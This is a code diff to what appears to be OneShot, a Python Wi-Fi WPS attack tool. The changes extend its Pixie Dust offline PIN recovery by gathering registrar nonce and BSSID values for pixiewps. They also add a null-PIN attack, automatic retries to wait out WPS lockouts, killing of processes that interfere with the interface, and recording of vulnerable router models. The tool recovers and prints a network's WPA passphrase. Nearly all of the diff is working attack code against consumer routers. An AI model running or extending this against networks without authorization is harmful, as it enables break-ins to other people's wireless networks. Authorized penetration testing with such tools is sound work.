@@ -447,30 +447,43 @@ class PixiewpsData:
         self.e_hash2 = ''
         self.authkey = ''
         self.e_nonce = ''
+        self.r_nonce = ''
+        self.bssid = ''
 
     def clear(self):
         self.__init__()
 
     def got_all(self):
-        return (self.pke and self.pkr and self.e_nonce and self.authkey
-                and self.e_hash1 and self.e_hash2)
+        return (self.pke and self.pkr and self.e_nonce and self.r_nonce
+                and self.authkey and self.e_hash1 and self.e_hash2
+                and self.bssid)
 
     def get_pixie_cmd(self, full_range=False):
-        pixiecmd = "pixiewps --pke {} --pkr {} --e-hash1 {}"\
-                    " --e-hash2 {} --authkey {} --e-nonce {}".format(
-                    self.pke, self.pkr, self.e_hash1,
-                    self.e_hash2, self.authkey, self.e_nonce)
+        pixiecmd = ['pixiewps']
+        pixiecmd.extend([
+            '--pke', self.pke,
+            '--pkr', self.pkr,
+            '--e-hash1', self.e_hash1,
+            '--e-hash2', self.e_hash2,
+            '--authkey', self.authkey,
+            '--e-nonce', self.e_nonce,
+            '--r-nonce', self.r_nonce,
+            '--e-bssid', self.bssid,
+            '--mode', '1,2,3,4,5'
+        ])
         if full_range:
-            pixiecmd += ' --force'
+            pixiecmd.append('--force')
         return pixiecmd
 
 
 class ConnectionStatus:
     def __init__(self):
-        self.status = ''   # Must be WSC_NACK, WPS_FAIL or GOT_PSK
+        self.status = ''   # Must be WSC_NACK, WPS_FAIL, WPS_TIMEOUT or GOT_PSK
         self.last_m_message = 0
         self.essid = ''
         self.wpa_psk = ''
+        self.is_locked = False
+        self.bssid = ''
 
     def isFirstHalfValid(self):
         return self.last_m_message > 5
@@ -546,6 +559,7 @@ class Companion:
 
         self.bssid = bssid
         self.lastPwr = 0
+        self.disconnect_count = 0
 
     def __init_wpa_supplicant(self):
         cmd = 'wpa_supplicant -K -d -Dnl80211,wext,hostapd,wired -i{} -c{}'.format(self.interface, self.tempconf)
@@ -602,6 +616,13 @@ class Companion:
             RealtimeLogger.stdout(line)
 
         if line.startswith('WPS: '):
+            if 'M2D' in line:
+                RealtimeLogger.warn('Received WPS Message M2D')
+                self.connection_status.status = 'WPS_FAIL'
+                self.connection_status.is_locked = True
+                RealtimeLogger.err('This AP is not accepting PINs right now without configuration')
+                return False
+
             if 'Building Message M' in line:
                 n = int(line.split('Building Message M')[1].replace('D', ''))
                 self.connection_status.last_m_message = n
@@ -615,37 +636,45 @@ class Companion:
             elif 'Received WSC_NACK' in line:
                 self.connection_status.status = 'WSC_NACK'
                 self.__print_with_indicators('*', 'Received WSC NACK')
+                if self.connection_status.last_m_message < 3:
+                    self.connection_status.is_locked = True
+                    return False
                 RealtimeLogger.err('Wrong PIN code')
             elif 'Enrollee Nonce' in line and 'hexdump' in line:
                 self.pixie_creds.e_nonce = get_hex(line)
                 assert(len(self.pixie_creds.e_nonce) == 16*2)
                 if pixiemode:
-                    print('[P] E-Nonce: {}'.format(self.pixie_creds.e_nonce))
+                    RealtimeLogger.info(f'[P] E-Nonce: {self.pixie_creds.e_nonce}')
+            elif 'Registrar Nonce' in line and 'hexdump' in line:
+                self.pixie_creds.r_nonce = get_hex(line)
+                assert(len(self.pixie_creds.r_nonce) == 16*2)
+                if pixiemode:
+                    RealtimeLogger.info(f'[P] R-Nonce: {self.pixie_creds.r_nonce}')
             elif 'DH own Public Key' in line and 'hexdump' in line:
                 self.pixie_creds.pkr = get_hex(line)
                 assert(len(self.pixie_creds.pkr) == 192*2)
                 if pixiemode:
-                    print('[P] PKR: {}'.format(self.pixie_creds.pkr))
+                    RealtimeLogger.info(f'[P] PKR: {self.pixie_creds.pkr}')
             elif 'DH peer Public Key' in line and 'hexdump' in line:
                 self.pixie_creds.pke = get_hex(line)
                 assert(len(self.pixie_creds.pke) == 192*2)
                 if pixiemode:
-                    print('[P] PKE: {}'.format(self.pixie_creds.pke))
+                    RealtimeLogger.info(f'[P] PKE: {self.pixie_creds.pke}')
             elif 'AuthKey' in line and 'hexdump' in line:
                 self.pixie_creds.authkey = get_hex(line)
                 assert(len(self.pixie_creds.authkey) == 32*2)
                 if pixiemode:
-                    print('[P] AuthKey: {}'.format(self.pixie_creds.authkey))
+                    RealtimeLogger.info(f'[P] AuthKey: {self.pixie_creds.authkey}')
             elif 'E-Hash1' in line and 'hexdump' in line:
                 self.pixie_creds.e_hash1 = get_hex(line)
                 assert(len(self.pixie_creds.e_hash1) == 32*2)
                 if pixiemode:
-                    print('[P] E-Hash1: {}'.format(self.pixie_creds.e_hash1))
+                    RealtimeLogger.info(f'[P] E-Hash1: {self.pixie_creds.e_hash1}')
             elif 'E-Hash2' in line and 'hexdump' in line:
                 self.pixie_creds.e_hash2 = get_hex(line)
                 assert(len(self.pixie_creds.e_hash2) == 32*2)
                 if pixiemode:
-                    print('[P] E-Hash2: {}'.format(self.pixie_creds.e_hash2))
+                    RealtimeLogger.info(f'[P] E-Hash2: {self.pixie_creds.e_hash2}')
             elif 'Network Key' in line and 'hexdump' in line:
                 self.connection_status.status = 'GOT_PSK'
                 self.connection_status.wpa_psk = bytes.fromhex(get_hex(line)).decode('utf-8', errors='replace')
@@ -656,8 +685,12 @@ class Companion:
         elif ('WPS-FAIL' in line) and (self.connection_status.status != ''):
             self.connection_status.status = 'WPS_FAIL'
             RealtimeLogger.err('wpa_supplicant returned WPS-FAIL')
-#        elif 'NL80211_CMD_DEL_STATION' in line:
-#            print("[!] Unexpected interference — kill NetworkManager/wpa_supplicant!")
+        elif 'WPS-TIMEOUT' in line:
+            self.connection_status.status = 'WPS_TIMEOUT'
+        elif 'NL80211_CMD_DEL_STATION' in line:
+            self.disconnect_count += 1
+            if self.disconnect_count == 5:
+                RealtimeLogger.warn('Received NL80211 DEL_STATION too many times — possible interference')
         elif 'Trying to authenticate with' in line:
             self.connection_status.status = 'authenticating'
             if 'SSID' in line:
@@ -703,8 +736,14 @@ class Companion:
         RealtimeLogger.step('Running Pixiewps (offline PIN recovery)…')
         cmd = self.pixie_creds.get_pixie_cmd(full_range)
         if showcmd:
-            RealtimeLogger.cmd(cmd)
-        r = RealtimeLogger.run_subprocess(cmd)
+            RealtimeLogger.cmd(' '.join(cmd))
+        try:
+            r = subprocess.run(cmd, stdout=subprocess.PIPE,
+                               stderr=subprocess.STDOUT, encoding='utf-8')
+        except (subprocess.CalledProcessError, FileNotFoundError) as e:
+            RealtimeLogger.err(f'Pixiewps error: {e}')
+            return False
+        print(r.stdout)
         if r.returncode == 0:
             for line in r.stdout.splitlines():
                 if ('[+]' in line) and ('WPS pin' in line):
@@ -779,50 +818,86 @@ class Companion:
             return None
         return pin
 
-    def __wps_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False, verbose=None):
+    def __wps_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False, verbose=None, retry_on_lock=False):
         if not verbose:
             verbose = self.print_debug
-        self.pixie_creds.clear()
-        self.connection_status.clear()
-        self.wpas.stdout.read(300)   # Clean the pipe
-        if pbc_mode:
-            if bssid:
-                RealtimeLogger.step(f'Starting WPS push button connection to {bssid}…')
-                cmd = f'WPS_PBC {bssid}'
-            else:
-                RealtimeLogger.step('Starting WPS push button connection…')
-                cmd = 'WPS_PBC'
-        else:
-            RealtimeLogger.step(f'Trying PIN {pin}')
-            cmd = f'WPS_REG {bssid} {pin}'
-
-        RealtimeLogger.step(f'Sending WPS command to wpa_supplicant…')
-        r = self.sendAndReceive(cmd)
-        if 'OK' not in r:
-            self.connection_status.status = 'WPS_FAIL'
-            msg = self._explain_wpas_not_ok_status(cmd, r)
-            RealtimeLogger.err(msg)
-            return False
-
-        RealtimeLogger.ok(f'WPS command accepted by wpa_supplicant')
 
         while True:
-            res = self.__handle_wpas(pixiemode=pixiemode, pbc_mode=pbc_mode, verbose=verbose, bssid=bssid.lower())
-            if not res:
-                break
-            if self.connection_status.status == 'WSC_NACK':
-                break
-            elif self.connection_status.status == 'GOT_PSK':
-                break
-            elif self.connection_status.status == 'WPS_FAIL':
-                break
+            self.pixie_creds.clear()
+            self.connection_status.clear()
+            self.wpas.stdout.read(300)   # Clean the pipe
 
-        self.sendOnly('WPS_CANCEL')
-        return False
+            wps_start_time = time.time()
+
+            if pbc_mode:
+                if bssid:
+                    RealtimeLogger.step(f'Starting WPS push button connection to {bssid}…')
+                    cmd = f'WPS_PBC {bssid}'
+                else:
+                    RealtimeLogger.step('Starting WPS push button connection…')
+                    cmd = 'WPS_PBC'
+            else:
+                RealtimeLogger.step(f'Trying PIN {pin}')
+                cmd = f'WPS_REG {bssid} {pin}'
+
+            if bssid:
+                self.pixie_creds.bssid = bssid.upper()
+
+            RealtimeLogger.step(f'Sending WPS command to wpa_supplicant…')
+            r = self.sendAndReceive(cmd)
+            if 'OK' not in r:
+                self.connection_status.status = 'WPS_FAIL'
+                msg = self._explain_wpas_not_ok_status(cmd, r)
+                RealtimeLogger.err(msg)
+                return False
+
+            RealtimeLogger.ok(f'WPS command accepted by wpa_supplicant')
+
+            while True:
+                if not ifaceUpCheck(self.interface):
+                    RealtimeLogger.err(f'Interface {self.interface} is no longer UP. Aborting.')
+                    self.connection_status.status = 'WPS_FAIL'
+                    break
+
+                res = self.__handle_wpas(pixiemode=pixiemode, pbc_mode=pbc_mode, verbose=verbose, bssid=bssid.lower() if bssid else '')
+                if not res:
+                    break
+                if self.connection_status.status in ('WSC_NACK', 'GOT_PSK', 'WPS_FAIL'):
+                    break
+
+                if self.connection_status.status == 'WPS_TIMEOUT':
+                    elapsed = int(time.time() - wps_start_time)
+                    RealtimeLogger.warn(f'WPS timeout after {elapsed}s')
+                    try:
+                        self.wpas.terminate()
+                        self.wpas.wait(timeout=2)
+                    except subprocess.TimeoutExpired:
+                        self.wpas.kill()
+                    self.__init_wpa_supplicant()
+                    time.sleep(1)
+                    r = self.sendAndReceive(cmd)
+                    if 'OK' not in r:
+                        self.connection_status.status = 'WPS_FAIL'
+                        RealtimeLogger.err(self._explain_wpas_not_ok_status(cmd, r))
+                        return False
+                    self.connection_status.clear()
+                    continue
+
+            self.sendOnly('WPS_CANCEL')
+
+            if retry_on_lock and self.connection_status.is_locked:
+                timeout_val = getattr(args, 'timeout', 60)
+                RealtimeLogger.warn(f'{bssid} is WPS LOCKED. Retrying in {timeout_val}s…')
+                time.sleep(timeout_val)
+                continue
+
+            return False
 
     def single_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False, showpixiecmd=False,
-                          pixieforce=False, store_pin_on_fail=False):
-        if not pin:
+                          pixieforce=False, store_pin_on_fail=False, null_pin=False):
+        if null_pin:
+            pin = '00000000'
+        elif not pin:
             if pixiemode:
                 try:
                     # Try using the previously calculated PIN
@@ -847,13 +922,13 @@ class Companion:
             pin = '<PBC mode>'
         elif store_pin_on_fail:
             try:
-                self.__wps_connection(bssid, pin, pixiemode)
+                self.__wps_connection(bssid, pin, pixiemode, retry_on_lock=True)
             except KeyboardInterrupt:
                 print("\nAborting…")
                 self.__savePin(bssid, pin)
                 return False
         else:
-            self.__wps_connection(bssid, pin, pixiemode)
+            self.__wps_connection(bssid, pin, pixiemode, retry_on_lock=True)
 
         if self.connection_status.status == 'GOT_PSK':
             self.__credentialPrint(pin, self.connection_status.wpa_psk, self.connection_status.essid)
@@ -1018,8 +1093,10 @@ class WiFiScanner:
         def handle_network(line, result, networks):
             networks.append(
                     {
+                        'ESSID': '',
                         'Security type': 'Unknown',
                         'WPS': False,
+                        'WPS version': '1.0',
                         'WPS locked': False,
                         'Model': '',
                         'Model number': '',
@@ -1051,12 +1128,21 @@ class WiFiScanner:
                 if result.group(1) == 'RSN':
                     sec = 'WPA/WPA2'
             elif sec == 'WPA2':
-                if result.group(1) == 'WPA':
+                if result.group(1) == 'PSK SAE':
+                    sec = 'WPA2/WPA3'
+                elif result.group(1) == 'WPA':
                     sec = 'WPA/WPA2'
             networks[-1]['Security type'] = sec
 
         def handle_wps(line, result, networks):
-            networks[-1]['WPS'] = result.group(1)
+            networks[-1]['WPS'] = True
+
+        def handle_wpsVersion(line, result, networks):
+            wps_ver = networks[-1]['WPS version']
+            wps_ver_filtered = result.group(1).replace('* Version2:', '')
+            if wps_ver_filtered == '2.0':
+                wps_ver = '2.0'
+            networks[-1]['WPS version'] = wps_ver
 
         def handle_wpsLocked(line, result, networks):
             flag = int(result.group(1), 16)
@@ -1089,6 +1175,8 @@ class WiFiScanner:
             re.compile(r'(RSN):\t [*] Version: (\d+)'): handle_securityType,
             re.compile(r'(WPA):\t [*] Version: (\d+)'): handle_securityType,
             re.compile(r'WPS:\t [*] Version: (([0-9]*[.])?[0-9]+)'): handle_wps,
+            re.compile(r' [*] Version2: (.+)'): handle_wpsVersion,
+            re.compile(r' [*] Authentication suites: (.+)'): handle_securityType,
             re.compile(r' [*] AP setup locked: (0x[0-9]+)'): handle_wpsLocked,
             re.compile(r' [*] Model: (.*)'): handle_model,
             re.compile(r' [*] Model Number: (.*)'): handle_modelNumber,
@@ -1203,8 +1291,8 @@ class WiFiScanner:
                 colored('Already stored', color='yellow')
             ))
         print('Networks list:')
-        print('{:<4} {:<18} {:<25} {:<8} {:<4} {:<27} {:<}'.format(
-            '#', 'BSSID', 'ESSID', 'Sec.', 'PWR', 'WSC device name', 'WSC model'))
+        print('{:<4} {:<18} {:<25} {:<8} {:<4} {:<5} {:<27} {:<}'.format(
+            '#', 'BSSID', 'ESSID', 'Sec.', 'PWR', 'Ver.', 'WSC device name', 'WSC model'))
 
         network_list_items = list(network_list.items())
         if args.reverse_scan:
@@ -1230,6 +1318,7 @@ class WiFiScanner:
                 essid,
                 processed_security,
                 processed_level,
+                truncateStr(network['WPS version'], 5),
                 processed_device,
                 processed_model
             ]
@@ -1237,6 +1326,8 @@ class WiFiScanner:
             
             if (network['BSSID'], network.get('ESSID', 'HIDDEN')) in self.stored:
                 print(colored(line, color='yellow'))
+            elif network['WPS version'] == '1.0':
+                print(colored(line, color='green'))
             elif network['WPS locked']:
                 print(colored(line, color='red'))
             elif self.vuln_list and (model in self.vuln_list):
@@ -1246,20 +1337,21 @@ class WiFiScanner:
 
         return network_list
 
-    def prompt_network(self) -> str:
+    def prompt_network(self):
         networks = self.iw_scanner()
         if not networks:
             RealtimeLogger.err('No WPS networks found.')
-            return
+            return None
         while 1:
             try:
                 networkNo = input('Select target (press Enter to refresh): ')
                 if networkNo.lower() in ('r', '0', ''):
                     return self.prompt_network()
                 elif int(networkNo) in networks.keys():
-                    bssid = networks[int(networkNo)]['BSSID']
+                    selected = networks[int(networkNo)]
+                    bssid = selected['BSSID']
                     RealtimeLogger.info(f'Selected target: {bssid}')
-                    return bssid
+                    return (bssid, selected)
                 else:
                     raise IndexError
             except Exception:
@@ -1282,6 +1374,158 @@ def ifaceUp(iface, down=False):
 def die(msg):
     sys.stderr.write(msg + '\n')
     sys.exit(1)
+
+
+def ifaceUpCheck(interface):
+    """Check if the network interface is still up."""
+    try:
+        cmd = f'ip link show {interface}'
+        r = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
+                           stderr=subprocess.PIPE, encoding='utf-8', timeout=5)
+        if r.returncode != 0:
+            return False
+        return 'UP' in r.stdout
+    except (OSError, subprocess.TimeoutExpired):
+        return False
+
+
+def isAndroid():
+    """Check if running on Android."""
+    return bool(hasattr(sys, 'getandroidapilevel'))
+
+
+def clearScreen():
+    """Clear the terminal screen."""
+    sys.stdout.write('\033[H\033[2J')
+    sys.stdout.flush()
+
+
+# -- Interfering-process detection (from OneShot-Extended) --
+import json
+
+
+def _getInterferingProcesses():
+    """Get processes using the generic netlink subsystem."""
+    try:
+        with open('/proc/net/netlink', 'r', encoding='utf-8') as f:
+            next(f)
+            tokens = (line.split() for line in f)
+            pids = {int(p[2]) for p in tokens if len(p) > 2 and p[1] == '16'}
+            pids.discard(os.getpid())
+    except IOError:
+        return []
+    interfering = []
+    for pid in pids:
+        try:
+            fd_entries = os.scandir(f'/proc/{pid}/fd')
+            has_socket = any('socket' in os.readlink(e.path) for e in fd_entries)
+            if has_socket:
+                with open(f'/proc/{pid}/comm', 'r', encoding='utf-8') as fc:
+                    pname = fc.read().strip()
+                if pname == 'system_server':
+                    continue
+                interfering.append((pid, pname))
+        except OSError:
+            continue
+    return interfering
+
+
+def _getProcessCommand(pid):
+    try:
+        with open(f'/proc/{pid}/cmdline', 'r', encoding='utf-8') as f:
+            return f.read().replace('\0', ' ').strip()
+    except OSError:
+        return ''
+
+
+def _saveKilledProcesses(processes):
+    if not processes:
+        return
+    try:
+        killed_file = os.path.join(os.path.expanduser('~/.OneShot/sessions/'), 'killed_processes.json')
+        os.makedirs(os.path.dirname(killed_file), exist_ok=True)
+        with open(killed_file, 'w', encoding='utf-8') as f:
+            json.dump(processes, f, indent=2)
+    except IOError as e:
+        RealtimeLogger.err(f'Failed to save killed processes: {e}')
+
+
+def checkRunningProcesses(interface):
+    """Warn about processes using the interface."""
+    interfering = _getInterferingProcesses()
+    if interfering:
+        procs = ', '.join([f'{n} (PID {p})' for p, n in interfering])
+        RealtimeLogger.warn(f'Process using {interface}: {procs}')
+
+
+def killInterfering():
+    """Kill interfering processes."""
+    interfering = _getInterferingProcesses()
+    killed = []
+    if interfering:
+        for pid, pname in interfering:
+            try:
+                cmdline = _getProcessCommand(pid)
+                os.kill(pid, 15)
+                RealtimeLogger.warn(f'Terminated {pname} (PID {pid})')
+                killed.append((pid, pname, cmdline))
+                time.sleep(1.5)
+            except OSError as e:
+                RealtimeLogger.err(f'Failed to terminate {pname} (PID {pid}): {e}')
+        _saveKilledProcesses(killed)
+
+
+def restoreProcesses():
+    """Restore previously killed processes."""
+    killed_file = os.path.join(os.path.expanduser('~/.OneShot/sessions/'), 'killed_processes.json')
+    if not os.path.exists(killed_file):
+        return
+    try:
+        with open(killed_file, 'r', encoding='utf-8') as f:
+            killed = json.load(f)
+    except (IOError, json.JSONDecodeError):
+        return
+    for pid, pname, cmdline in killed:
+        if not cmdline:
+            continue
+        try:
+            subprocess.Popen(cmdline, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            RealtimeLogger.info(f'Restored {pname}')
+        except (OSError, subprocess.SubprocessError):
+            pass
+    try:
+        os.remove(killed_file)
+    except OSError:
+        pass
+
+
+def addVulnerableAP(network_info, vuln_list_file):
+    """Add vulnerable device model to vulnwsc.txt if not already present."""
+    if not network_info:
+        return
+    model = network_info.get('Model', '').strip()
+    model_number = network_info.get('Model number', '').strip()
+    device_name = network_info.get('Device name', '').strip()
+    vuln_entry = None
+    if model:
+        vuln_entry = f'{model} {model_number}'.strip() if model_number else model
+    elif device_name:
+        vuln_entry = device_name
+    if not vuln_entry:
+        return
+    try:
+        try:
+            with open(vuln_list_file, 'r', encoding='utf-8') as f:
+                existing = [line.strip() for line in f if line.strip()]
+        except FileNotFoundError:
+            existing = []
+        if vuln_entry in existing:
+            return
+        with open(vuln_list_file, 'a', encoding='utf-8') as f:
+            f.write(f'{vuln_entry}\n')
+            RealtimeLogger.info(f'Added {vuln_entry} to vulnerable list')
+    except IOError as e:
+        RealtimeLogger.err(f'Failed to save to vulnerable list: {e}')
 
 
 def usage():
@@ -1366,6 +1610,37 @@ if __name__ == '__main__':
         '--pbc', '--push-button-connect',
         action='store_true',
         help='Run WPS push button connection'
+        )
+    parser.add_argument(
+        '-N', '--null-pin',
+        action='store_true',
+        help='Use a null pin (00000000)'
+        )
+    parser.add_argument(
+        '-k', '--kill',
+        action='store_true',
+        help='Automatically kill processes interfering with the wireless interface'
+        )
+    parser.add_argument(
+        '--restore',
+        action='store_true',
+        help='Restore killed interfering processes on exit (--kill)'
+        )
+    parser.add_argument(
+        '-t', '--timeout',
+        type=float,
+        default=60,
+        help='Set the timeout for retrying after WPS lock (default: %(default)s)'
+        )
+    parser.add_argument(
+        '-c', '--clear',
+        action='store_true',
+        help='Clear the screen on every wi-fi scan'
+        )
+    parser.add_argument(
+        '-D', '--dont-touch-settings',
+        action='store_true',
+        help="Don't touch the Android Wi-Fi settings on startup and exit"
         )
     parser.add_argument(
         '-d', '--delay',
@@ -1454,7 +1729,14 @@ if __name__ == '__main__':
                     scanner = WiFiScanner(args.interface, vuln_list)
                     if not args.loop:
                         RealtimeLogger.info('No BSSID specified — scanning for available networks')
-                    args.bssid = scanner.prompt_network()
+                    result = scanner.prompt_network()
+                    if result is None:
+                        if args.loop:
+                            args.bssid = None
+                            continue
+                        else:
+                            break
+                    args.bssid, network_info = result
 
                 if args.bssid:
                     companion = Companion(args.interface, args.write, print_debug=args.verbose)
